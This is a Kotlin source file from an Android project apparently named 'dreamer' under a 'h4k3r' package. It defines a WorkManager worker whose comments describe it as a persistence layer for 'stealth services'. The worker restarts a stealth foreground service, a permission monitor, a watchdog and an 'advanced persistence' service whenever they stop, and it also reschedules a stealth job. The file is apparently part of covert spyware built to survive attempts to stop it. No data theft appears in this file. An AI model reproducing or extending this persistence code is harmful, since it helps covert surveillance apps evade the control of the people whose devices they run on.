package com.h4k3r.dreamer

import android.content.Context
import android.content.Intent
import android.os.Build
import android.util.Log
import androidx.work.Worker
import androidx.work.WorkerParameters

/**
 * Worker class for the WorkManager API to ensure stealth services are running.
 * This worker is scheduled by StealthForegroundService to provide an additional
 * layer of persistence through Android's WorkManager system.
 */
class StealthRevivalWorker(context: Context, params: WorkerParameters) : Worker(context, params) {
    companion object {
        private const val TAG = "StealthRevivalWorker"
    }

    override fun doWork(): Result {
        Log.d(TAG, "StealthRevivalWorker started")
        
        try {
            // Check if the main stealth service is running
            if (!ServiceUtils.isServiceRunning(applicationContext, StealthForegroundService::class.java)) {
                Log.d(TAG, "StealthForegroundService not running, starting it")
                startStealthForegroundService()
            }
            
            // Check and start other critical services
            startCriticalServicesIfNeeded()
            
            // Schedule the stealth job for additional persistence
            StealthJobService.scheduleJob(applicationContext)
            
            Log.d(TAG, "StealthRevivalWorker completed successfully")
            return Result.success()
        } catch (e: Exception) {
            Log.e(TAG, "Error in StealthRevivalWorker", e)
            return Result.retry()
        }
    }
    
    private fun startStealthForegroundService() {
        try {
            val serviceIntent = Intent(applicationContext, StealthForegroundService::class.java)
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                applicationContext.startForegroundService(serviceIntent)
            } else {
                applicationContext.startService(serviceIntent)
            }
            
            Log.d(TAG, "Started StealthForegroundService")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to start StealthForegroundService", e)
        }
    }
    
    private fun startCriticalServicesIfNeeded() {
        val criticalServices = arrayOf(
            PermissionMonitorService::class.java,
            WatchdogService::class.java,
            AdvancedPersistenceService::class.java
        )
        
        for (serviceClass in criticalServices) {
            if (!ServiceUtils.isServiceRunning(applicationContext, serviceClass)) {
                try {
                    val serviceIntent = Intent(applicationContext, serviceClass)
                    
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        applicationContext.startForegroundService(serviceIntent)
                    } else {
                        applicationContext.startService(serviceIntent)
                    }
                    
                    Log.d(TAG, "Started ${serviceClass.simpleName}")
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to start ${serviceClass.simpleName}", e)
                }
            }
        }
    }
}